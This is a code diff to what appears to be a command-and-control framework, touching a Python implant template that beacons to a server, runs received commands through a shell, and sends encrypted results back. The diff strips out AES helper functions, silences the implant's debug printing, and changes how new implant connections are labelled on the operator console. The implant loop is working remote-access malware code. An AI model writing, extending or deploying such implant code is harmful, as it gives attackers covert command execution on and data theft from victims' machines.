@@ -38,17 +38,6 @@ urls = [%s]
 killdate = "%s"
 useragent = ""
 
-def get_encryption( key, iv='0123456789ABCDEF' ):  
-  from Crypto.Cipher import AES
-  aes = AES.new( base64.b64decode(key), AES.MODE_CBC, iv )
-  return aes
-
-def decrypt( key, data ):
-  iv = data[0:16]
-  aes = get_encryption(key, iv)
-  data =  aes.decrypt( base64.b64decode(data) )
-  return data[16:]
-
 def decrypt_bytes_gzip( key, data):
   iv = data[0:16]
   aes = get_encryption(key, iv)
@@ -58,24 +47,6 @@ def decrypt_bytes_gzip( key, data):
   infile = StringIO.StringIO(data[16:])
   with gzip.GzipFile(fileobj=infile, mode="r") as f:
     data = f.read()
-  return data
-
-def encrypt( key, data, gzip=False ):
-  if gzip:
-    import StringIO
-    import gzip
-    out = StringIO.StringIO()
-    with gzip.GzipFile(fileobj=out, mode="w") as f:
-      f.write(data)
-    data = out.getvalue() 
-  mod = len(data) %% 16
-  if mod != 0:
-    newlen = len(data) + (16-mod)
-    data = data.ljust( newlen, '\\0' )
-  aes = get_encryption(key)
-  data = aes.IV + aes.encrypt( data )
-  if not gzip:
-    data = base64.b64encode( data )
   return data
 
 while(True):
@@ -102,12 +73,12 @@ while(True):
         returncmd = returncmd.replace("multicmd","")
         split = returncmd.split("!d-3dion@LD!-d")
         for cmd in split:
-          print cmd
+          #print cmd
           if "$sleeptime" in cmd:
             timer = int(cmd.replace("$sleeptime = ",""))
           else:
             returnval = subprocess.check_output(cmd, shell=True)
-            print returnval
+            #print returnval
             server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
             opener = urllib2.build_opener()
             postcookie = encrypt(key, cmd)
@@ -417,7 +388,10 @@ while($true)
 
   def display(self):
     print Colours.GREEN,""
-    print "New %s implant connected: (uri=%s key=%s)" % (self.Pivot, self.RandomURI, self.Key)
+    it = self.Pivot
+    if (it == "OSX"):
+      it = "Python"
+    print "New %s implant connected: (uri=%s key=%s)" % (it, self.RandomURI, self.Key)
     print "%s | URL:%s | Time:%s | PID:%s | Sleep:%s | %s (%s) " % (self.IPAddress, self.Proxy, self.FirstSeen, 
       self.PID, self.Sleep, self.Domain, self.Arch)
     print "",Colours.END
